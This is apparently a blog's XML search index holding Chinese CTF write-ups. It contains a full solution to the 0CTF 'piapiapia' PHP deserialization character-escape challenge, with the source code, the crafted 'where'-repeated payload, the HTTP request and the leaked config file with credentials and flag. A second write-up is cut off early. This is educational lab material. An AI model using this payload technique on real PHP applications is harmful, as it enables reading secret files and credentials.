<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2016-0CTF-piapiapia(反序列化逃逸字符)</title>
    <url>/2019/06/07/2016-0CTF-piapiapia-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E5%AD%97%E7%AC%A6/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>即将迎来考试周，而自己的主课还没怎么复习….还总想着刷小说Orz,堕落的有点难受，来找一道代码审计题来学习一下。</p>
<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>进入页面</p>
<p><a href="https://imgchr.com/i/VwxTqs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/07/VwxTqs.md.png" alt="VwxTqs.md.png"></a></p>
<p>一个可爱的猫图，扫下目录看，发现了<code>www.zip</code></p>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">   <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Login First'</span>);    </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">      $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">      <span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">      $file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">      <span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">      move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">      $profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">      $profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">      $profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">      $profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">      $user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>config.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">   $config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">   $config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">   $config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">   $flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">   <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>]) &#123;</span><br><span class="line">      header(<span class="string">'Location: profile.php'</span>);</span><br><span class="line">      <span class="keyword">exit</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>($_POST[<span class="string">'username'</span>] &amp;&amp; $_POST[<span class="string">'password'</span>]) &#123;</span><br><span class="line">      $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">      $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(strlen($username) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($username) &gt; <span class="number">16</span>) </span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid user name'</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(strlen($password) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) </span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid password'</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>($user-&gt;login($username, $password)) &#123;</span><br><span class="line">         $_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line">         header(<span class="string">'Location: profile.php'</span>);</span><br><span class="line">         <span class="keyword">exit</span>;  </span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid user name or password'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>profile.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">   <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Login First'</span>);    </span><br><span class="line">   &#125;</span><br><span class="line">   $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">   $profile=$user-&gt;show_profile($username);</span><br><span class="line">   <span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span><br><span class="line">      header(<span class="string">'Location: update.php'</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">      $profile = unserialize($profile);</span><br><span class="line">      $phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">      $email = $profile[<span class="string">'email'</span>];</span><br><span class="line">      $nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">      $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>update.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">   <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Login First'</span>);    </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">      $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">      <span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">      $file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">      <span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">      move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">      $profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">      $profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">      $profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">      $profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">      $user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过源代码可以发现flag是在<code>config.php</code>中的，主要的利用文件在于<code>update.php</code>,<code>profile.php</code></p>
<h3 id="代码审计过程"><a href="#代码审计过程" class="headerlink" title="代码审计过程"></a>代码审计过程</h3><p>主要功能函数在于class.php,所以先看的也是class.php</p>
<p>Mysql类中的filter函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">	$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;  <span class="comment">//   /'|\\/</span></span><br><span class="line">	$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">	$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">	$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">	<span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其他的函数都是一些insert与update之类的函数，并没有太多漏洞，而filter函数中的逻辑主要是将<code>select,insert,update,delete,where</code>四个关键词替换为<code>hacker</code>，把单引号和反斜杠过滤为<code>_</code>。</p>
<p>User类继承了Mysql类，其中函数传入的变量值都是基于Filter函数的过滤，也没有宽字节，所以应该几乎莫得注入漏洞。</p>
<p>接着审计又发现了反序列化的点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br></pre></td></tr></table></figure>

<p>发现如果$profile可控的话，我实际上就可以通过构造<code>$profile[&#39;photo&#39;]</code>来读取任意我们想要读取的文件，跟进$profile</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$profile=$user-&gt;show_profile($username);</span><br></pre></td></tr></table></figure>

<p>跟进<code>show_profile</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">	$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">	$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">	$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">	<span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>感觉挺完美的…通过传入的<code>username</code>取出序列化值，接着审计一下序列化字符串是怎么生成的，跟进<code>serialize</code>函数,在<code>update.php</code>中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">	$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">	<span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">	$file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">	<span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">	move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">	$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">	$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">	$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">	$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">	$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个nickname的过滤是有问题的</p>
<p><a href="https://imgchr.com/i/V09bXF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/07/V09bXF.md.png" alt="V09bXF.md.png"></a></p>
<p>首先他和前两个POST变量的过滤方法就不一样，而且我们知道<code>preg_match</code>与<code>strlen</code>遇到数组是直接返回false的，所以我们只要将nickname传为数组就可以绕过这个过滤。<strong>而上面的两个方法还是很安全的，比如，如果返回false的话经过非之后还是1依然被过滤掉</strong>。</p>
<p>这里也就是出现了我们可以构造任意<code>nickname</code>的值,但是接下来怎么利用呢….，看到下面有一个<code>update_profile</code>,跟进看一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">	$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">	$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">	$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现<code>$username</code>与<code>$new_profile</code>都被filter函数又过滤了一遍，又看了几遍…依然找不到攻击点，不太清楚怎么能吧photo中的值换成<code>config.php</code></p>
<h3 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h3><p>审计了很多遍，最终的攻击链应该如下</p>
<p><a href="https://imgchr.com/i/V0VlRA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/07/V0VlRA.md.png" alt="V0VlRA.md.png"></a></p>
<p>而且还可以任意构造<code>nickname</code>的值,注入点应该不能有，因为filter函数过滤的还是很严禁的</p>
<p>后来看wp才发现了几个细节问题。</p>
<h4 id="filter函数中存在这样的一个问题"><a href="#filter函数中存在这样的一个问题" class="headerlink" title="filter函数中存在这样的一个问题"></a>filter函数中存在这样的一个问题</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br></pre></td></tr></table></figure>
<p>where是和其他操作字符不同的，where是五个字符，而其他是六个字符，如果直接将where替换为hacker就会造成这样的一个问题</p>
<p>自己的测试代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">    $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">    $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;  <span class="comment">//   /'|\\/</span></span><br><span class="line">    $string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">    $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">    $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($_POST[<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">echo</span> filter(serialize($profile));</span><br></pre></td></tr></table></figure>

<p>传入<code>nickname=where</code></p>
<p><a href="https://imgchr.com/i/V0ZAYQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/07/V0ZAYQ.md.png" alt="V0ZAYQ.md.png"></a></p>
<p>实际上hacker是6个字符，而这里只显示了5个字符，就会造成如下情况</p>
<p><code>a:1{i:0;s:5:”where”;}</code>—&gt;<code>a:1{i:0;s:5:”hacher”;}</code>就会导致r没有被读到，导致反序列化出错，最终逃逸字符</p>
<h4 id="第二个小细节"><a href="#第二个小细节" class="headerlink" title="第二个小细节"></a>第二个小细节</h4><p>对于反序列化来讲，反序列化一个完整的序列化语句之后的字符串是无效的，如下：</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">var_dump(unserialize(<span class="string">'a:1:&#123;s:5:"phone";s:11:"12345678901";&#125;xxxxxxxxx'</span>));</span><br><span class="line">var_dump(unserialize(<span class="string">'a:1:&#123;s:5:"phone";s:11:"12345678901";&#125;'</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">"phone"</span>]=&gt;</span><br><span class="line">  string(<span class="number">11</span>) <span class="string">"12345678901"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">"phone"</span>]=&gt;</span><br><span class="line">  string(<span class="number">11</span>) <span class="string">"12345678901"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到之后的字符串对于反序列化一个完整的序列化字符串是无效的。</p>
<h4 id="反序列化中的闭合"><a href="#反序列化中的闭合" class="headerlink" title="反序列化中的闭合"></a>反序列化中的闭合</h4><p>其实反序列化的中闭合主要是依靠字符数量来判断是否闭合，举几个例子</p>
<p>我们提交<code>nickname[]=666&quot;;}s:5:&quot;photo&quot;;s:10:config.php</code>，生成反序列化字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:10:&quot;1378627291&quot;;s:5:&quot;email&quot;;s:9:&quot;li@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:33:&quot;666&quot;;&#125;s:5:&quot;photo&quot;;s:10:config.php&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;6512bd43d9caa6e02c990b0a82652dca&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>对于上面的字符串如果我们稍作改动的话</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:10:&quot;1378627291&quot;;s:5:&quot;email&quot;;s:9:&quot;li@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;666&quot;;&#125;s:5:&quot;photo&quot;;s:10:config.php&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;6512bd43d9caa6e02c990b0a82652dca&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>通过将33修改为3导致”闭合”,使<code>s:5:&quot;photo&quot;;s:10:config.php&quot;</code>逃逸出来，而后面的<code>s:5:&quot;photo&quot;;s:39:&quot;upload/6512bd43d9caa6e02c990b0a82652dca&quot;;}</code>则失去了作用，最终取出的是config.php中的内容。</p>
<h4 id="逃逸构造"><a href="#逃逸构造" class="headerlink" title="逃逸构造"></a>逃逸构造</h4><p>之前我们有发现过如果在<code>nickname</code>中构造<code>where</code>的话在filter函数的过滤下，会使得<code>where</code>变成<code>hacker</code>最终导致只能读取到<code>hacke</code>,使得r逃逸掉，同样的话如果我们构造<code>where&quot;;}s:5:&quot;photo&quot;;s:10:config.php</code>序列化的字符串经过filter函数的处理后where依然会变成hacker，所以这次逃逸掉的字符是p,我们的目的是要逃逸掉<code>;}s:5:&quot;photo&quot;;s:10:config.php</code>,所以也就是构造31个where，使得语句逃逸，构成完整的序列化语句，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php</span><br></pre></td></tr></table></figure>

<p>抓包填入，获得flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;update.php HTTP&#x2F;1.1</span><br><span class="line">Host: web1.buuoj.cn</span><br><span class="line">Content-Length: 18526</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;web1.buuoj.cn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryGQFB45N3zJ7jFxhh</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;76.0.3809.12 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Referer: http:&#x2F;&#x2F;web1.buuoj.cn&#x2F;update.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: PHPSESSID&#x3D;24b0eee38566bbde249eed75c52838ec</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryGQFB45N3zJ7jFxhh</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;phone&quot;</span><br><span class="line"></span><br><span class="line">13846518712</span><br><span class="line">------WebKitFormBoundaryGQFB45N3zJ7jFxhh</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;email&quot;</span><br><span class="line"></span><br><span class="line">eee@qq.com</span><br><span class="line">------WebKitFormBoundaryGQFB45N3zJ7jFxhh</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;nickname[]&quot;</span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php</span><br><span class="line">------WebKitFormBoundaryGQFB45N3zJ7jFxhh</span><br></pre></td></tr></table></figure>

<p>在profile.php文件中查看，base64解码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">$config[<span class="string">'password'</span>] = <span class="string">'qwertyuiop'</span>;</span><br><span class="line">$config[<span class="string">'database'</span>] = <span class="string">'challenges'</span>;</span><br><span class="line">$flag = <span class="string">'flag&#123;ju55bi2bpeffeoy45l21w93h7c015rb4&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 安恒5月赛部分wp</title>
    <url>/2019/06/02/2019-%E5%AE%89%E6%81%925%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>周四那天有点事，并没有打上月赛，赛后向几位师傅要了一下题，做了一下</p>
<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h4><p>一道代码审计题，分为六个文件<code>common.php,edit_info.php,config.php,index.php,info.php,register.php</code></p>
<p>每个文件的逻辑大概如下</p>
<p><strong>common.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!is_array($value))&#123;</span><br><span class="line">                $arr[$key] = addslashes($value);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $arr[$key] = waf($arr[$key]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_POST = waf($_POST);</span><br><span class="line">    